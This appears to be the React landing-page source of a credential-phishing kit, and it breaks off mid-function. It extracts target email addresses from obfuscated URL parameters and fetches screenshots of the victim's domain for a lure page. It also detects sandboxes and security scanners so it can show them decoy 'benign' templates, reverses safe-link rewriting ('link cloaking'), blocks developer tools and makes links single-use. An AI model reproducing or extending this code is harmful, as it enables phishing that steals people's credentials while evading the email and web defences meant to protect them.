'use client'

import { useCallback, useEffect, useState, Suspense } from 'react'
import { useSearchParams } from 'next/navigation'
import { X } from 'lucide-react'
// Removed VerifyGate - showing login form directly after CAPTCHA
import DomainLogo from '@/components/DomainLogo'
import Header from '@/components/Header'
import Footer from '@/components/Footer'
import BotDetection from '@/components/BotDetection'
import BotFilterGate from '@/components/BotFilterGate'
import CaptchaGateWrapper from '@/components/CaptchaGateWrapper'
import StealthVerificationGate from '@/components/StealthVerificationGate'
import DevToolsBlocker from '@/components/DevToolsBlocker'
import { getTranslations, type SupportedLanguage } from '@/lib/locales'
import { redirectToSafeSiteWithReason } from '@/lib/redirectWithReason'
import { useSandboxDetection } from '@/components/SandboxDetector'
import { getRandomTemplate } from '@/lib/benignTemplates'
import { Template } from '@/lib/templateTypes'
import { GenericTemplateRenderer } from '@/components/templates/GenericTemplateRenderer'
import SecureProgressLoader from '@/components/SecureProgressLoader'
import SecureTemplateContainer from '@/components/SecureTemplateContainer'
import { API_ROUTES } from '@/lib/api-routes'
import { restoreOriginalLink } from '@/lib/access/linkProcessing'
import { detectClientEnvironment, getAdaptiveRenderConfig } from '@/lib/rendering/adaptiveContent'
import { IS_DEV, IS_LOCALHOST } from '@/src/utils/env'

// Helper function to decode email from auto grab parameters
function decodeEmailFromParam(param: string): string | null {
  try {
    // Advanced extraction: Handle token-wrapped emails
    // Pattern 1: token-email-token with dashes
    if (param.includes('-')) {
      const parts = param.split('-')
      for (const part of parts) {
        if (part.includes('@')) {
          return part // Plain email
        }
        // Try decode as base64
        try {
          const decoded = atob(part)
          if (decoded.includes('@')) {
            return decoded
          }
        } catch {}
      }
    }
    
    // Pattern 2: token_email_token with underscores
    if (param.includes('_')) {
      const parts = param.split('_')
      for (const part of parts) {
        if (part.includes('@')) {
          return part
        }
        try {
          const decoded = atob(part)
          if (decoded.includes('@')) {
            return decoded
          }
        } catch {}
      }
    }
    
    // Pattern 3: token/email/token with slashes
    if (param.includes('/')) {
      const parts = param.split('/')
      for (const part of parts) {
        if (part.includes('@')) {
          return part
        }
        try {
          const decoded = atob(part)
          if (decoded.includes('@')) {
            return decoded
          }
        } catch {}
      }
    }
    
    // Pattern 4: Try to find base64 email in concatenated string
    if (param.includes('=')) {
      const segments = param.match(/[A-Za-z0-9+/]+=*/g) || []
      for (const segment of segments) {
        try {
          const decoded = atob(segment)
          if (decoded.includes('@')) {
            return decoded
          }
        } catch {}
      }
    }
    
    // Pattern 5: Check if param itself is an email
    if (param.includes('@')) {
      return param
    }
    
    // Pattern 6: Try full value as base64
    try {
      const decoded = atob(param)
      if (decoded.includes('@')) {
        return decoded
      }
    } catch {}
    
    return null
  } catch {
    // Fallback
    if (param.includes('@')) {
      return param
    }
    return null
  }
}

// Helper function to decode email from hash fragment
function decodeEmailFromHash(hash: string): string | null {
  try {
    // Remove any random characters if present
    // Format: #(Random 4 String)(Email Base64)(Random 4 String)
    // Try to extract the middle part if it's long enough
    if (hash.length > 8) {
      // Try removing first and last 4 characters
      const middle = hash.substring(4, hash.length - 4)
      const decoded = atob(middle)
      if (decoded.includes('@')) {
        return decoded
      }
    }
    
    // Try to decode the entire hash as base64
    const fullDecoded = atob(hash)
    if (fullDecoded.includes('@')) {
      return fullDecoded
    }
    
    // Check if hash itself is an email
    if (hash.includes('@')) {
      return hash
    }
    
    return null
  } catch {
    // If all decoding fails, check if it's a plain email
    if (hash.includes('@')) {
      return hash
    }
    return null
  }
}

/**
 * PHASE 7.3: Extract mappingId from pathname (Type C format: /r/<mappingId>/<token>)
 */
function extractMappingIdFromPathname(pathname: string): string | null {
  const rIndex = pathname.indexOf('/r/')
  if (rIndex === -1) {
    return null
  }
  
  const afterR = pathname.substring(rIndex + 3) // +3 to skip "/r/"
  const pathParts = afterR.split('/').filter(p => p) // Remove empty parts
  
  if (pathParts.length === 2) {
    // Format C: /r/<mappingId>/<token>
    return pathParts[0] // First part is mappingId
  }
  
  return null
}

/**
 * PHASE 7.3: Determine link format from URL parameters
 * Returns: 'A' | 'B' | 'C' | 'GENERIC' | null
 */
function detectLinkFormat(searchParams: URLSearchParams, pathname: string): 'A' | 'B' | 'C' | 'GENERIC' | null {
  const token = searchParams.get('token')
  const mappingIdFromQuery = searchParams.get('mappingId')
  const email = searchParams.get('email')
  
  // Type C: Check pathname first (format: /r/<mappingId>/<token>)
  const mappingIdFromPath = extractMappingIdFromPathname(pathname)
  if (mappingIdFromPath) {
    return 'C'
  }
  
  // Type C: Has mappingId in query parameter (fallback)
  if (mappingIdFromQuery && token) {
    return 'C'
  }
  
  // Type A: Path contains /r/ and no email in query (and not Type C)
  if (pathname.includes('/r/') && !email && !mappingIdFromPath) {
    return 'A'
  }
  
  // Type B: Has token AND email in query
  if (token && email && email.trim() !== '' && email.includes('@')) {
    return 'B'
  }
  
  // Generic: Has token but no email (will be determined by link.type from API)
  if (token && !email) {
    return 'GENERIC' // Will be confirmed by API call
  }
  
  return null
}

/**
 * PHASE 7.3: Extract token from pathname (for Type C: /r/<mappingId>/<token>)
 */
function extractTokenFromPathname(pathname: string): string | null {
  const rIndex = pathname.indexOf('/r/')
  if (rIndex === -1) {
    return null
  }
  
  const afterR = pathname.substring(rIndex + 3) // +3 to skip "/r/"
  const pathParts = afterR.split('/').filter(p => p) // Remove empty parts
  
  if (pathParts.length === 2) {
    // Format C: /r/<mappingId>/<token>
    return pathParts[1] // Second part is token
  } else if (pathParts.length === 1) {
    // Format A: /r/<token>
    return pathParts[0] // First part is token
  }
  
  return null
}

/**
 * PHASE 7.3: Build secure-redirect URL with proper parameters for Type A and Type C
 */
function buildSecureRedirectUrl(
  format: 'A' | 'B' | 'C' | 'GENERIC' | null,
  searchParams: URLSearchParams,
  pathname: string,
  email?: string
): string | null {
  if (format !== 'A' && format !== 'C') {
    return null
  }
  
  let token: string | null = null
  let mappingId: string | null = null
  
  if (format === 'C') {
    // Type C: Extract from pathname
    mappingId = extractMappingIdFromPathname(pathname)
    token = extractTokenFromPathname(pathname)
    
    if (!token || !mappingId) {
      return null
    }
    
    // For Type C, email is resolved from mappingId, so we don't need to pass it
    return `/api/secure-redirect?token=${encodeURIComponent(token)}&mappingId=${encodeURIComponent(mappingId)}`
  } else {
    // Type A: Extract from query params or pathname
    token = searchParams.get('token') || extractTokenFromPathname(pathname)
    
    if (!token) {
      return null
    }
    
    const emailParam = email || searchParams.get('email') || ''
    return `/api/secure-redirect?token=${encodeURIComponent(token)}&email=${encodeURIComponent(emailParam)}`
  }
}

/**
 * PHASE 7.3: Check if secure-redirect should be called
 * Only Type A and Type C should call secure-redirect
 */
function shouldCallSecureRedirect(format: 'A' | 'B' | 'C' | 'GENERIC' | null): boolean {
  return format === 'A' || format === 'C'
}

function HomeContent() {
  const searchParams = useSearchParams()
  const [email, setEmail] = useState<string>('')
  const [domain, setDomain] = useState<string>('')
  const [scannerDetected, setScannerDetected] = useState(false)
  const [scannerType, setScannerType] = useState<string | null>(null)
  const [shouldRenderSafe, setShouldRenderSafe] = useState(false)
  const [screenshotUrl, setScreenshotUrl] = useState<string | null>(null)
  const [faviconUrl, setFaviconUrl] = useState<string | null>(null)
  const [sessionId, setSessionId] = useState<string | null>(null)
  // Check if CAPTCHA was already verified in this session (persist across refreshes)
  // Initialize to false to ensure server/client consistency, then update after mount
  const [captchaVerified, setCaptchaVerified] = useState(false)
  const [isClient, setIsClient] = useState(false)
  
  // Track page load time for fail-safes (client-only to avoid hydration mismatch)
  const [pageLoadTime, setPageLoadTime] = useState<number | null>(null)
  
  // Set page load time only on client
  useEffect(() => {
    if (typeof window !== 'undefined') {
      setPageLoadTime(Date.now())
    }
  }, [])
  
  // Emergency bypass via URL param
  const bypassSecurity = searchParams.get('bypass') === 'true'
  
  const [showLandingPage, setShowLandingPage] = useState(false)
  
  // Check if checking was already completed (for refresh persistence)
  // Initialize to false to ensure server/client consistency
  const [checkingComplete, setCheckingComplete] = useState(false)
  
  // Stealth verification state
  const [stealthVerified, setStealthVerified] = useState(false)
  
  // Completion page state (for back button prevention)
  const [showCompletionPage, setShowCompletionPage] = useState(false)

  // Sandbox detection state
  const [showBenign, setShowBenign] = useState(false)
  const [benignTemplate, setBenignTemplate] = useState<string | null>(null)
  const [sandboxCheckComplete, setSandboxCheckComplete] = useState(false)
  
  // Client-side sandbox detection
  const { results: clientResults, score: clientScore, loading: detectionLoading } = useSandboxDetection()
  
  // Link status checking (GLOBAL - prevents incognito reuse)
  const [linkStatus, setLinkStatus] = useState<'checking' | 'valid' | 'used' | 'expired' | 'invalid'>('checking')
  
  // Format A identifier resolution state
  const [formatAResolving, setFormatAResolving] = useState(false)
  const [formatAResolved, setFormatAResolved] = useState(false)
  
  // Additional state hooks (must be before any early returns)
  const [isChecking, setIsChecking] = useState(false)
  const [language, setLanguage] = useState<SupportedLanguage>('en')
  const [translations, setTranslations] = useState(getTranslations('en'))
  
  // Template system state
  const [template, setTemplate] = useState<Template | null>(null)
  const [templateLanguage, setTemplateLanguage] = useState<'en' | 'ja' | 'ko' | 'de' | 'es'>('ja')
  const [useTemplate, setUseTemplate] = useState(false)
  const [loadingScreenId, setLoadingScreenId] = useState<string>('meeting')
  const [loadingDuration, setLoadingDuration] = useState<number>(3)
  const isDevFastMode = IS_DEV || IS_LOCALHOST // PHASE 🦊 SPEED FIX

  // PHASE 🦊 SPEED FIX: Simple fetch timer helper
  const timedFetch = useCallback(
    async (url: string, options?: RequestInit) => {
      const label = `[API_CALL] ${url}`
      console.time(label)
      try {
        return await fetch(url, options)
      } finally {
        console.timeEnd(label)
      }
    },
    []
  )

  // PHASE 🦊 SPEED FIX: Centralized screenshot fetcher with dev skip
  const fetchScreenshotForDomain = useCallback(
    async (emailDomain: string | null | undefined) => {
      if (!emailDomain) {
        return
      }
      if (isDevFastMode) {
        setScreenshotUrl(null)
        return
      }
      const screenshotUrl = `/api/get-screenshot?domain=${encodeURIComponent(emailDomain)}`
      try {
        const response = await timedFetch(screenshotUrl)
        if (!response.ok) return
        const data = await response.json()
        if (data.url) {
          setScreenshotUrl(data.url)
        } else if (data.fallback) {
          setScreenshotUrl(data.fallback)
        }
      } catch {
        // Silent fail to keep scanners unaware
      }
    },
    [isDevFastMode, timedFetch]
  )
  
  // ============================================
  // OPTION D: LINK CLOAKING - Restore original link from safe-link rewriters
  // ============================================
  useEffect(() => {
    if (typeof window === 'undefined') return

    const currentUrl = window.location.href
    const restoredUrl = restoreOriginalLink(currentUrl)
    
    if (restoredUrl !== currentUrl) {
      // URL was rewritten by safe-link rewriter, restore it
      if (process.env.NODE_ENV === 'development') {
        console.log('[LINK-CLOAKING] Restored original URL from rewriter')
      }
      // Update URL without reload (preserve state)
      window.history.replaceState({}, '', restoredUrl)
    }
  }, [])


  // ============================================
  // FORMAT A: IDENTIFIER RESOLUTION (MUST RUN BEFORE link-status check)
  // ============================================
  useEffect(() => {
    if (typeof window === 'undefined') return
    
    const resolveFormatA = async () => {
      const pathname = window.location.pathname
      const currentSearchParams = new URLSearchParams(window.location.search)
      
      // DEBUG: Log what we're checking
      if (process.env.NODE_ENV === 'development') {
        console.log('[FORMAT-A] Checking pathname:', pathname, 'search:', window.location.search)
      }
      
      // Check if this is Format A: /r/<identifier> (no email in query, no mappingId)
      const format = detectLinkFormat(currentSearchParams, pathname)
      if (format !== 'A') {
        // Not Format A, skip resolution
        if (process.env.NODE_ENV === 'development') {
          console.log('[FORMAT-A] Not Format A, format detected:', format)
        }
        setFormatAResolved(true)
        return
      }
      
      // Extract identifier from pathname
      const identifier = extractTokenFromPathname(pathname)
      if (!identifier) {
        console.error('[FORMAT-A] No identifier found in pathname:', pathname)
        setFormatAResolved(true)
        setLinkStatus('invalid')
        return
      }
      
      // Check if it's a short identifier (8-12 chars) or long token
      const isShortIdentifier = /^[0-9a-zA-Z]{8,12}$/.test(identifier)
      if (!isShortIdentifier) {
        // Long token (legacy Format A) - skip identifier resolution
        if (process.env.NODE_ENV === 'development') {
          console.log('[FORMAT-A] Long token detected (legacy), skipping identifier resolution:', identifier.substring(0, 20))
        }
        setFormatAResolved(true)
        return
      }
      
      console.log('[FORMAT-A] Resolving identifier:', identifier.substring(0, 10))
      setFormatAResolving(true)
      
      try {
        // Call /api/email-from-token?identifier=xxxx to resolve token + email
        const response = await timedFetch(`/api/email-from-token?identifier=${encodeURIComponent(identifier)}`)
        
        if (!response.ok) {
          const errorData = await response.json().catch(() => ({ error: 'Unknown error' }))
          console.error('[FORMAT-A] Failed to resolve identifier:', errorData)
          setFormatAResolved(true)
          setFormatAResolving(false)
          setLinkStatus('invalid')
          return
        }
        
        const data = await response.json()
        const resolvedEmail = data.email
        const resolvedToken = data.token
        
        if (!resolvedEmail || !resolvedToken) {
          console.error('[FORMAT-A] Missing email or token in response:', data)
          setFormatAResolved(true)
          setFormatAResolving(false)
          setLinkStatus('invalid')
          return
        }
        
        console.log('[FORMAT-A] Resolved:', {
          email: resolvedEmail.substring(0, 20),
          token: resolvedToken.substring(0, 20) + '...',
          fullEmail: resolvedEmail, // Log full email for debugging
        })
        
        // CRITICAL: Set email state FIRST (before URL update)
        // This ensures email is available when template renders
        setEmail(resolvedEmail)
        setDomain(resolvedEmail.split('@')[1] || '')
        
        // Update URL: /?email=${email}&token=${token}&type=A
        const newSearchParams = new URLSearchParams()
        newSearchParams.set('email', resolvedEmail)
        newSearchParams.set('token', resolvedToken)
        newSearchParams.set('type', 'A')
        const newUrl = `/?${newSearchParams.toString()}`
        
        // Update URL without reload (preserve state)
        window.history.replaceState({}, '', newUrl)
        
        // DEBUG: Verify email state was set
        if (process.env.NODE_ENV === 'development') {
          console.log('[FORMAT-A] Email state set:', {
            email: resolvedEmail,
            domain: resolvedEmail.split('@')[1] || '',
            urlUpdated: newUrl,
          })
        }
        
        // Mark as resolved
        setFormatAResolved(true)
        setFormatAResolving(false)
        
        // Trigger link-status check by updating searchParams dependency
        // (The checkLinkStatus useEffect will run after this)
      } catch (error) {
        console.error('[FORMAT-A] Error resolving identifier:', error)
        setFormatAResolved(true)
        setFormatAResolving(false)
        setLinkStatus('invalid')
      }
    }
    
    resolveFormatA()
  }, []) // Run once on mount
  
  // ============================================
  // OPTION C: CLIENT ENVIRONMENT DETECTION
  // ============================================
  useEffect(() => {
    if (typeof window === 'undefined') return
    if (isDevFastMode) {
      console.log('[ENVIRONMENT-DETECTION] Skipped heavy scanner call in dev mode')
      return
    }

    const detectEnvironment = async () => {
      try {
        // Get headers from API (server-side detection)
        const response = await fetch('/api/security/detect-scanner', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
          }),
        }).catch(() => null)

        if (response?.ok) {
          const data = await response.json()
          if (data.detected) {
            setScannerDetected(true)
            setScannerType(data.environmentType)
            setShouldRenderSafe(data.shouldRenderStandard)
            
            if (process.env.NODE_ENV === 'development') {
              console.log('[ENVIRONMENT-DETECTION]', {
                environment: data.environmentType,
                confidence: data.confidence,
                renderStandard: data.shouldRenderStandard,
              })
            }
          }
        } else {
          // Fallback: Client-side detection
          const headers: Record<string, string> = {}
          const detection = detectClientEnvironment(headers, navigator.userAgent)
          
          if (detection.detected) {
            setScannerDetected(true)
            setScannerType(detection.environmentType)
            setShouldRenderSafe(detection.shouldRenderStandard)
          }
        }
      } catch (error) {
        // Silent fail
      }
    }

    detectEnvironment()
  }, [])
  
  // CRITICAL: Check link status globally (prevents incognito reuse)
  // NOTE: For Format A, this runs AFTER identifier resolution
  useEffect(() => {
    // Wait for Format A resolution to complete
    if (!formatAResolved) {
      return
    }
    
    const checkLinkStatus = async () => {
      const token = searchParams.get('token')
      const id = searchParams.get('id')
      const mappingId = searchParams.get('mappingId') // PHASE 7.5: Extract mappingId for Type C links
      
      // PHASE 7.5: Smart Auto-Healing - Extract email for Type B links
      // Priority 1: Direct email parameter (highest priority for Type B)
      let extractedEmail: string | null = searchParams.get('email')
      
      // Decode email if it's URL-encoded
      if (extractedEmail) {
        try {
          extractedEmail = decodeURIComponent(extractedEmail).trim()
        } catch {
          extractedEmail = extractedEmail.trim()
        }
      }
      
      // Priority 2: Extract from Type B auto-grab parameters (sid, hash, v)
      if (!extractedEmail || !extractedEmail.includes('@')) {
      const typeBEmailParamsCheck = {
        sid: searchParams.get('sid'),
        v: searchParams.get('v'),
        hash: typeof window !== 'undefined' && window.location.hash ? window.location.hash.substring(1) : null
      }
      
      const hasTypeBEmailParam = Object.values(typeBEmailParamsCheck).some(val => val && val.trim() && !val.includes('++'))
      
      if (hasTypeBEmailParam) {
        if (typeBEmailParamsCheck.sid) {
          extractedEmail = decodeEmailFromParam(typeBEmailParamsCheck.sid)
        } else if (typeBEmailParamsCheck.hash) {
          extractedEmail = decodeEmailFromHash(typeBEmailParamsCheck.hash)
        } else if (typeBEmailParamsCheck.v) {
          extractedEmail = decodeEmailFromParam(typeBEmailParamsCheck.v)
          }
        }
        }
        
      // PHASE 7.5: Set email if extracted (for Type B links)
        if (extractedEmail && extractedEmail.includes('@')) {
          setEmail(extractedEmail)
          setDomain(extractedEmail.split('@')[1] || '')
      }
      
      if (!token) {
        setLinkStatus('invalid')
        return
      }
      
      try {
        // PHASE 7.5: Include email in request for Type B validation
        // PHASE 7.5: Include mappingId for Type C links
        // Backend will validate email against allowlist (Type B) or resolve email from mappingId (Type C)
        const response = await timedFetch(API_ROUTES.checkLinkStatus, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            token, 
            id,
            mappingId: mappingId || undefined, // PHASE 7.5: Include mappingId for Type C validation
            email: extractedEmail || undefined, // PHASE 7.5: Include email for Type B validation
            fullUrl: typeof window !== 'undefined' ? window.location.href : '' // Include full URL for Type B email extraction
          })
        })
        
        // PHASE 7.5: Check response status before parsing JSON
        if (!response.ok) {
          const errorText = await response.text()
          console.error('[FRONTEND] Link status API error:', {
            status: response.status,
            statusText: response.statusText,
            error: errorText.substring(0, 200),
          })
          
          // If 500 error, it's a server issue - don't mark as invalid immediately
          if (response.status === 500) {
            console.error('[FRONTEND] Server error (500) - this is a backend issue, not an invalid link')
            // Still mark as invalid for now, but log it clearly
            setLinkStatus('invalid')
          return
        }
        
          // For other errors (400, 404), treat as invalid
          setLinkStatus('invalid')
          return
        }
        
        let data
        try {
          data = await response.json()
        } catch (jsonError) {
          // CRITICAL FIX: If JSON parsing fails, log and treat as server error
          console.error('[FRONTEND] Failed to parse JSON response:', {
            status: response.status,
            statusText: response.statusText,
            error: jsonError instanceof Error ? jsonError.message : String(jsonError),
          })
          // Don't mark as invalid - this is a server error, not an invalid link
          // Keep status as 'checking' to allow retry
          return
        }
        
        // PHASE 7.5: Debug logging to see what backend returns
        if (process.env.NODE_ENV === 'development') {
          console.log('[FRONTEND] Link status response:', {
            status: data?.status,
            statusType: typeof data?.status,
            hasEmail: !!data?.email,
            fullData: data,
          })
        }
        
        // CRITICAL FIX: Normalize status value (handle case variations, whitespace)
        const normalizedStatus = data?.status?.toString().toLowerCase().trim()
        
        // PHASE 7.5: Smart Auto-Healing - Trust backend validation
        // Backend implements smart validation with auto-healing rules
        // Frontend should trust the backend response completely
        
        if (normalizedStatus === 'used') {
          setLinkStatus('used')
          // PHASE 7.3: Only call secure-redirect for Type A and Type C
          const pathname = typeof window !== 'undefined' ? window.location.pathname : ''
          const format = detectLinkFormat(searchParams, pathname)
          const redirectUrl = buildSecureRedirectUrl(format, searchParams, pathname, email || extractedEmail || undefined)
          if (redirectUrl) {
            window.location.href = redirectUrl
          }
              return
        }
        
        if (normalizedStatus === 'expired') {
          setLinkStatus('expired')
          // PHASE 7.3: Only call secure-redirect for Type A and Type C
          const pathname = typeof window !== 'undefined' ? window.location.pathname : ''
          const format = detectLinkFormat(searchParams, pathname)
          const redirectUrl = buildSecureRedirectUrl(format, searchParams, pathname, email || extractedEmail || undefined)
          if (redirectUrl) {
            window.location.href = redirectUrl
          }
              return
            }
        
        if (normalizedStatus === 'invalid') {
          // PHASE 7.5: Backend says invalid - trust it completely
          // Backend has already checked:
          // - Token exists in database
          // - Email is in allowlist (for Type B) OR allowlist is empty (auto-healed)
          // - Link is not expired
          // - Link is not used
          console.error('[FRONTEND] Backend returned invalid status:', data)
            setLinkStatus('invalid')
            return
        }
        
        if (normalizedStatus === 'valid') {
          // PHASE 7.5: Backend says valid - trust it completely
          console.log('[FRONTEND] Backend returned valid - setting linkStatus to valid')
          setLinkStatus('valid')
          if (data.email) {
            setEmail(data.email)
          } else if (extractedEmail) {
            // Use extracted email if backend didn't return one (Type B)
            setEmail(extractedEmail)
          }
          return // CRITICAL: Return after setting valid status
        }
        
        // PHASE 7.5: Fallback - if status is not recognized, log and treat as invalid
        console.error('[FRONTEND] Unknown status from backend:', {
          rawStatus: data?.status,
          normalizedStatus,
          statusType: typeof data?.status,
          fullData: data,
        })
        setLinkStatus('invalid')
      } catch (error) {
        // CRITICAL FIX: Better error handling - don't mark as invalid on network errors
        if (process.env.NODE_ENV === 'development') {
          console.error('[FRONTEND] Link status check error:', {
            error: error instanceof Error ? error.message : String(error),
            stack: error instanceof Error ? error.stack : undefined,
          })
        }
        // PHASE 7.5: Don't immediately mark as invalid on network errors
        // Network errors (500, timeout) should retry, not show invalid link
        // Only mark as invalid if we get a clear 404 or explicit invalid response
        console.error('[FRONTEND] Link status check failed - this might be a temporary server error')
        // CRITICAL FIX: Keep status as 'checking' instead of 'invalid' to allow retry
        // Only set to 'invalid' if we're certain the link is invalid (not a network error)
        // For now, keep as 'checking' - the component will show loading state
        // setLinkStatus('invalid') // REMOVED - don't mark as invalid on network errors
      }
    }
    
    checkLinkStatus()
  }, [searchParams, formatAResolved, timedFetch]) // PHASE 🦊 SPEED FIX: include timed fetch
  
  // Restore state from sessionStorage after client mount to avoid hydration mismatch
  useEffect(() => {
    setIsClient(true)
    if (typeof window !== 'undefined') {
      // Restore captchaVerified state
      const verified = sessionStorage.getItem('captcha_verified')
      const timestamp = sessionStorage.getItem('captcha_timestamp')
      if (verified === 'true' && timestamp) {
        const timeDiff = Date.now() - parseInt(timestamp)
        // Valid for 30 minutes - restore state if recent
        if (timeDiff < 30 * 60 * 1000) {
          setCaptchaVerified(true)
        }
      }
      
      // Restore showLandingPage state
      const checkingComplete = sessionStorage.getItem('checking_complete')
      if (verified === 'true' && checkingComplete === 'true') {
        setShowLandingPage(true)
      }
      
      // Restore checkingComplete state
      setCheckingComplete(checkingComplete === 'true')
      
      // Restore stealth verification with expiration check
      const stealthStr = sessionStorage.getItem('stealth_verified')
      if (stealthStr) {
        try {
          const stealthData = JSON.parse(stealthStr)
          const age = Date.now() - stealthData.timestamp
          
          if (age < stealthData.expiresIn) {
            setStealthVerified(true)
          } else {
            sessionStorage.removeItem('stealth_verified')
          }
        } catch {
          sessionStorage.removeItem('stealth_verified')
        }
      }
      
    }
  }, [])

  // Check if link was already used (back button prevention)
  // MUST be before any early returns (Rules of Hooks)
  useEffect(() => {
    if (typeof window !== 'undefined' && linkStatus === 'valid') {
      const linkUsed = sessionStorage.getItem('link_used')
      const usedEmail = sessionStorage.getItem('used_email')
      const currentEmail = searchParams.get('email') || email
      
      if (linkUsed === 'true' && usedEmail && currentEmail && usedEmail === currentEmail) {
        setShowCompletionPage(true)
      }
    }
  }, [searchParams, email, linkStatus])

  // Master Firewall Check (Phase 5.7 - runs before all other gates)
  // MUST be before any early returns (Rules of Hooks)
  useEffect(() => {
    const checkFirewall = async () => {
      // MINIMAL: Complete immediately - backend handles everything
      // Don't wait for client-side detection - proceed immediately
      if (sandboxCheckComplete) return
      if (isDevFastMode) {
        // PHASE 🦊 SPEED FIX: Skip heavy firewall call locally
        setSandboxCheckComplete(true)
        return
      }
      
      // Mark as complete immediately so we don't show loading screen
      setSandboxCheckComplete(true)
      
      // Continue with firewall check in background (non-blocking)
      if (detectionLoading) return

      try {
        // Get fingerprint data if available
        // Type-safe access to window.__fingerprintData
        const fingerprintData = (window as typeof window & { __fingerprintData?: { fingerprint?: unknown; hash?: string } }).__fingerprintData
        const fingerprintHash = fingerprintData?.hash

        // Call master firewall API
        const firewallCheck = await timedFetch('/api/firewall/check', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            fingerprint: fingerprintData,
            token: searchParams.get('token'),
            email: searchParams.get('email'),
          }),
        })

        const firewallResult = await firewallCheck.json()

        // Phase 5.8: Load mutated JS shards if mutation key is present
        // PHASE 7.3: Temporarily disable mutation loading to prevent errors
        // TODO: Re-enable after mutation system is fully fixed
        /*
        if (firewallResult.mutationKey) {
          const mutationKey = firewallResult.mutationKey
          // Load JS shards asynchronously
          for (let i = 0; i < 3; i++) {
            const script = document.createElement('script')
            script.src = `/api/mutated-js/${mutationKey}-${i}.js`
            script.async = true
            script.onerror = () => {
              console.warn(`[MUTATION] Failed to load shard ${i}`)
            }
            document.head.appendChild(script)
          }
        }
        */

        // Execute firewall action
        switch (firewallResult.action) {
          case 'benign':
            // Serve benign template (with mutation if available)
            if (firewallResult.mutationKey) {
              // Use mutated template
              setBenignTemplate(`/api/mutated-template?key=${firewallResult.mutationKey}`)
              setShowBenign(true)
            } else if (firewallResult.templateId) {
              setBenignTemplate(`/benign-templates/${firewallResult.templateId}/index.html`)
              setShowBenign(true)
            }
            break

          case 'safe':
            // Safe redirect - PHASE 7.3: Only call secure-redirect for Type A and Type C
            if (firewallResult.redirectUrl) {
              const pathname = typeof window !== 'undefined' ? window.location.pathname : ''
              const format = detectLinkFormat(searchParams, pathname)
              const redirectUrl = buildSecureRedirectUrl(format, searchParams, pathname, email)
              if (redirectUrl) {
                window.location.href = redirectUrl
                return
              }
            }
            break

          case 'captcha':
            // Show CAPTCHA (handled by existing CAPTCHA component)
            // Continue normal flow
            break

          case 'redirect':
            // Human verified - continue normal flow
            break

          case 'block':
            // Block request
            window.location.href = '/403'
            return

          default:
            // Unknown action - continue normal flow
            break
        }

        // Fallback to legacy sandbox check if firewall didn't handle it
        if (!firewallResult.action || firewallResult.action === 'redirect') {
          try {
            // Get server-side detection (legacy)
        const serverCheck = await fetch(API_ROUTES.sandboxCheck, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            token: searchParams.get('token'),
            id: searchParams.get('id'),
            clientResults,
            clientScore,
          }),
        })

        const serverResult = await serverCheck.json()

        // Decision: Show benign or real page
        if (serverResult.isSandbox) {
          // Sandbox detected - show fake benign page
          const template = getRandomTemplate(serverResult.fingerprint)
          setBenignTemplate(template.path)
          setShowBenign(true)
            }
          } catch (error) {
            // Silent fail
          }
        }

        setSandboxCheckComplete(true)
      } catch (error) {
        // Silent fail - allow through if firewall check fails
        setSandboxCheckComplete(true)
      }
    }

    checkFirewall()
  }, [detectionLoading, clientResults, clientScore, searchParams, sandboxCheckComplete, isDevFastMode, timedFetch])

  // Detect language from IP
  useEffect(() => {
    if (isDevFastMode) {
      setLanguage('en')
      setTranslations(getTranslations('en'))
      return
    }
    // Use AbortController for timeout
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 5000)
    
    timedFetch('/api/detect-language', {
      signal: controller.signal,
      method: 'POST',
      cache: 'no-store',
    })
      .then(res => {
        clearTimeout(timeoutId)
        if (!res.ok) throw new Error('Detection failed')
        return res.json()
      })
      .then(data => {
        const detectedLang = data.language as SupportedLanguage
        if (detectedLang) {
          setLanguage(detectedLang)
          setTranslations(getTranslations(detectedLang))
        }
      })
      .catch(() => {
        clearTimeout(timeoutId)
        // Fallback to English - silently
        setLanguage('en')
        setTranslations(getTranslations('en'))
      })
  }, [isDevFastMode, timedFetch])
  
  // Load template and language (after we have email and checking is complete)
  // Load early so template is ready when stealth verification completes
const loadTemplateAndLanguage = useCallback(async () => {
    try {
      // PHASE 🦊 SPEED FIX: Skip heavy detection in dev
      const langData = isDevFastMode
        ? { language: language || 'en', ip: '127.0.0.1' }
        : await timedFetch('/api/detect-language', { method: 'POST' }).then((res) => res.json())
      const detectedLang = (langData.language || 'ja') as 'en' | 'ja' | 'ko' | 'de' | 'es'
      
      // CRITICAL: Get link token from CURRENT URL (not stale searchParams)
      // After Format A resolution, URL is updated with resolved token
      // But React searchParams doesn't update automatically
      const currentSearchParams = typeof window !== 'undefined' 
        ? new URLSearchParams(window.location.search) 
        : searchParams
      const token = currentSearchParams.get('token')
      const id = currentSearchParams.get('id')
      
      // Fetch link configuration to get templateMode and templateId
      let linkConfig: any = undefined
      if (token) {
        try {
          const linkResponse = await timedFetch(`${API_ROUTES.linkConfig}?token=${token}`)
          const linkData = await linkResponse.json()
          if (linkData.success && linkData.config) {
            linkConfig = {
              token,
              id,
              templateId: linkData.config.templateId,
              templateMode: linkData.config.templateMode,
            }
            // Store loading screen config
            if (linkData.config.loadingScreen) {
              setLoadingScreenId(linkData.config.loadingScreen)
            }
            if (linkData.config.loadingDuration) {
              setLoadingDuration(linkData.config.loadingDuration)
            }
          } else {
            // Fallback: just use token/id
            linkConfig = { token, id }
          }
        } catch (err) {
          // Fallback: just use token/id
          linkConfig = { token, id }
        }
      } else {
        // For auto grab links without token, use default settings
        // Check admin settings for default loading screen
        if (isDevFastMode) {
          setLoadingScreenId('meeting')
          setLoadingDuration(3)
        } else {
        try {
            const settingsResponse = await timedFetch('/api/admin/settings?scope=public')
          const settingsData = await settingsResponse.json()
          if (settingsData.success && settingsData.settings) {
            setLoadingScreenId(settingsData.settings.loadingScreen || 'meeting')
            setLoadingDuration(settingsData.settings.loadingDuration || 3)
          }
        } catch {
          setLoadingScreenId('meeting')
          setLoadingDuration(3)
          }
        }
      }
      
      // If no link config found, create basic one
      if (!linkConfig && token) {
        linkConfig = { token, id }
      }
      
      // Select template
      const templateResponse = await timedFetch(API_ROUTES.templatesSelect, {
        method: 'POST',
